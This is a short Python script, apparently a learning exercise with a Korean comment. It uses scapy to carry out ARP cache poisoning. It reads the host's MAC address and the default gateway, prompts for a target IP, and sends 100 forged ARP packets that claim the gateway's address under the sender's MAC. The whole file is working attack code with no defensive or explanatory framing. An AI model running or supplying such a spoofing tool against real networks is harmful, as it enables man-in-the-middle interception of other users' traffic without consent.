import netifaces
from scapy.all import *

ip_dev = ""
ip_addr = ""
mac_addr = ""
gate_ip = ""

def parse_info():

	global ip_dev
	global ip_addr
	global mac_addr
	global gate_ip

	ip_dev = netifaces.interfaces()
	ip_dev = ip_dev[1]

	ip_info = netifaces.ifaddresses(ip_dev)
	mac_addr = ip_info[17][0]['addr']
	ip_addr = ip_info[2][0]['addr']
	gate = netifaces.gateways()
	gate_ip = gate['default'][2][0]
	#print ("interface name : " + str(ip_dev))
	#print ("ip addr : " + str(ip_addr))
	#print ("mac addr : " + str(mac_addr))
	#print ("gate ip : " + str(gate_ip))


def send_pkt():

	global ip_addr
	global mac_addr
	global gate_ip
	
	target_ip = raw_input("Target IP addr is : ")

	""" 차후 개선방안
	broadcast = ip_addr.replace("." + ip_addr.split(',')[0], '') + ".255"
	print broadcast
	"""

	packet = Ether()/ARP(hwsrc = mac_addr, psrc = gate_ip, pdst = target_ip)
	#packet = Ether(dst="ff:ff:ff:ff:ff:ff" src=mac_addr)/ARP(hwsrc = mac_addr, pdst = target_ip)
	sendp(packet, inter=1, count=100)


if __name__=="__main__":
	parse_info()
	send_pkt()
